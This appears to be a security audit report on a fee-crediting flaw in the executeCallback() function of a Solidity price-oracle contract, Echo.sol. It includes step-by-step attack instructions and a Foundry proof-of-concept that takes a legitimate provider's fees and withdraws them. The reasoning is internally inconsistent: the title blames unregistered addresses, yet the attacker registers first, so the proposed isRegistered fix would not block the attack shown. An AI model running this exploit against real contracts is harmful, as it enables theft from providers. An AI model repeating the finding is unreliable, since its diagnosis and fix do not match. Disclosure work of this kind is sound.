### Title
Unregistered `providerToCredit` Address Accepted in `executeCallback()` Allows Fee Theft - (File: target_chains/ethereum/contracts/contracts/echo/Echo.sol)

### Summary

`Echo.executeCallback()` accepts a caller-supplied `providerToCredit` address and credits it with the full request fee without verifying that the address is a registered provider. Every other provider-facing function in `Echo.sol` enforces `isRegistered`, but `executeCallback()` does not. After the 15-second exclusivity window expires, any registered attacker can supply their own address as `providerToCredit`, steal the fee that belongs to the legitimate provider, and withdraw it via `withdrawAsFeeManager`.

### Finding Description

`Echo.executeCallback()` takes `providerToCredit` as a caller-controlled parameter and unconditionally writes to `_state.providers[providerToCredit].accruedFeesInWei`:

```solidity
_state.providers[providerToCredit].accruedFeesInWei += SafeCast
    .toUint128((req.fee + msg.value) - pythFee);
``` [1](#0-0) 

The only guard on `providerToCredit` is the exclusivity-period check, which only enforces `providerToCredit == req.provider` for the first `exclusivityPeriodSeconds` (default 15 seconds) after `publishTime`:

```solidity
if (block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds) {
    require(providerToCredit == req.provider, "Only assigned provider during exclusivity period");
}
``` [2](#0-1) 

Once that window closes, the check is skipped entirely and `providerToCredit` is never validated against the provider registry.

By contrast, every other function that touches a provider address enforces `isRegistered`:

- `requestPriceUpdatesWithCallback()` — `require(_state.providers[provider].isRegistered, "Provider not registered")`
- `setDefaultProvider()` — `require(_state.providers[provider].isRegistered, "Provider not registered")`
- `setProviderFee()` — `require(_state.providers[provider].isRegistered, "Provider not registered")`
- `setFeeManager()` — `require(_state.providers[msg.sender].isRegistered, "Provider not registered")` [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) 

`executeCallback()` is the only externally callable function that writes to a provider's fee balance without this guard.

The `ProviderInfo` struct stores `isRegistered` as a `bool` field: [7](#0-6) 

### Impact Explanation

An attacker who has registered as a provider (zero-cost, permissionless via `registerProvider`) and set themselves as their own fee manager can:

1. Call `registerProvider(0, 0, 0)` — registers with zero fees.
2. Call `setFeeManager(attackerAddress)` — sets themselves as fee manager.
3. Wait for any legitimate request's exclusivity period (15 seconds) to expire.
4. Call `executeCallback(attackerAddress, sequenceNumber, updateData, priceIds)` with valid public Pyth price data.
5. The full `req.fee` (the user's payment to the legitimate provider) is credited to the attacker's `accruedFeesInWei`.
6. Call `withdrawAsFeeManager(attackerAddress, amount)` to drain the stolen fees. [8](#0-7) 

The legitimate provider receives nothing for the request they were assigned. The impact is direct, repeatable theft of provider fees for every unfulfilled request after the exclusivity window.

### Likelihood Explanation

- `registerProvider` is permissionless and free (zero fees allowed).
- The exclusivity period is only 15 seconds by default.
- Pyth price update data is publicly available off-chain, so the attacker can construct valid `updateData` and `priceIds`.
- No privileged access is required. Any EOA can execute this attack.
- The attacker can monitor the mempool or simply poll for unfulfilled requests older than 15 seconds.

### Recommendation

Add a registration check for `providerToCredit` in `executeCallback()`, consistent with every other provider-facing function:

```solidity
require(
    _state.providers[providerToCredit].isRegistered,
    "Provider not registered"
);
```

This should be placed before the fee credit at line 161 of `Echo.sol`. [9](#0-8) 

### Proof of Concept

```solidity
// 1. Attacker registers as a provider with zero fees
vm.prank(attacker);
echo.registerProvider(0, 0, 0);

// 2. Attacker sets themselves as their own fee manager
vm.prank(attacker);
echo.setFeeManager(attacker);

// 3. Legitimate user makes a request to legitimateProvider
vm.deal(user, totalFee);
vm.prank(user);
uint64 seq = echo.requestPriceUpdatesWithCallback{value: totalFee}(
    legitimateProvider, block.timestamp, priceIds, callbackGasLimit
);

// 4. Wait for exclusivity period to expire (15 seconds)
vm.warp(block.timestamp + 16);

// 5. Attacker calls executeCallback crediting themselves
vm.prank(attacker);
echo.executeCallback(attacker, seq, updateData, priceIds);

// 6. Attacker's accruedFeesInWei is now non-zero; legitimateProvider got nothing
assertGt(echo.getProviderInfo(attacker).accruedFeesInWei, 0);
assertEq(echo.getProviderInfo(legitimateProvider).accruedFeesInWei, 0);

// 7. Attacker withdraws
vm.prank(attacker);
echo.withdrawAsFeeManager(attacker, echo.getProviderInfo(attacker).accruedFeesInWei);
``` [10](#0-9)

    function executeCallback(
        address providerToCredit,
        uint64 sequenceNumber,
        bytes[] calldata updateData,
        bytes32[] calldata priceIds
    ) external payable override {
        Request storage req = findActiveRequest(sequenceNumber);

        // Check provider exclusivity using configurable period
        if (
            block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds
        ) {
            require(
                providerToCredit == req.provider,
                "Only assigned provider during exclusivity period"
            );
        }

        // Verify priceIds match
        require(
            priceIds.length == req.priceIdPrefixes.length,
            "Price IDs length mismatch"
        );
        for (uint8 i = 0; i < req.priceIdPrefixes.length; i++) {
            // Extract first 8 bytes of the provided price ID
            bytes32 priceId = priceIds[i];
            bytes8 prefix;
            assembly {
                prefix := priceId
            }

            // Compare with stored prefix
            if (prefix != req.priceIdPrefixes[i]) {
                // Now we can directly use the bytes8 prefix in the error
                revert InvalidPriceIds(priceIds[i], req.priceIdPrefixes[i]);
            }
        }

        // TODO: should this use parsePriceFeedUpdatesUnique? also, do we need to add 1 to maxPublishTime?
        IPyth pyth = IPyth(_state.pyth);
        uint256 pythFee = pyth.getUpdateFee(updateData);
        PythStructs.PriceFeed[] memory priceFeeds = pyth.parsePriceFeedUpdates{
            value: pythFee
        }(
            updateData,
            priceIds,
            SafeCast.toUint64(req.publishTime),
            SafeCast.toUint64(req.publishTime)
        );

        // TODO: if this effect occurs here, we need to guarantee that executeCallback can never revert.
        // If executeCallback can revert, then funds can be permanently locked in the contract.
        // TODO: there also needs to be some penalty mechanism in case the expected provider doesn't execute the callback.
        // This should take funds from the expected provider and give to providerToCredit. The penalty should probably scale
        // with time in order to ensure that the callback eventually gets executed.
        // (There may be exploits with ^ though if the consumer contract is malicious ?)
        _state.providers[providerToCredit].accruedFeesInWei += SafeCast
            .toUint128((req.fee + msg.value) - pythFee);
